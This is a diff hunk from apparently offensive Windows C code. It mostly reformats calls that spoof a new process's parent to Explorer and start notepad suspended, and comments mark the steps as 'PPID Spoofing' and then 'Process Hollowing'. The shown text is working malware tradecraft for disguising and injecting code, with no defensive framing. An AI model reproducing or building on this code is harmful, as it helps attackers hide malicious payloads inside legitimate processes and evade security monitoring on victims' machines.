@@ -75,12 +75,31 @@ int main(int args, char *argc[])
 	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, ppid); // Explorer is where notepad is normally run under
 
 	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
-	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
-	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
-	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
+	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
+			GetProcessHeap(), 
+			0, 
+			attributeSize);
+	InitializeProcThreadAttributeList(
+			si.lpAttributeList, 
+			1, 
+			0, 
+			&attributeSize);
+	UpdateProcThreadAttribute(
+			si.lpAttributeList, 
+			0, 
+			PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
+			&parentProcessHandle, 
+			sizeof(HANDLE), 
+			NULL, 
+			NULL);
 	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
-	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi);
+	CreateProcessA(
+			NULL, (LPSTR)"notepad", NULL, NULL, FALSE, 
+			EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, 
+			NULL, NULL, 
+			&si.StartupInfo, 
+			&pi);
     // PPID Spoofing
     
     // Process Hollowing
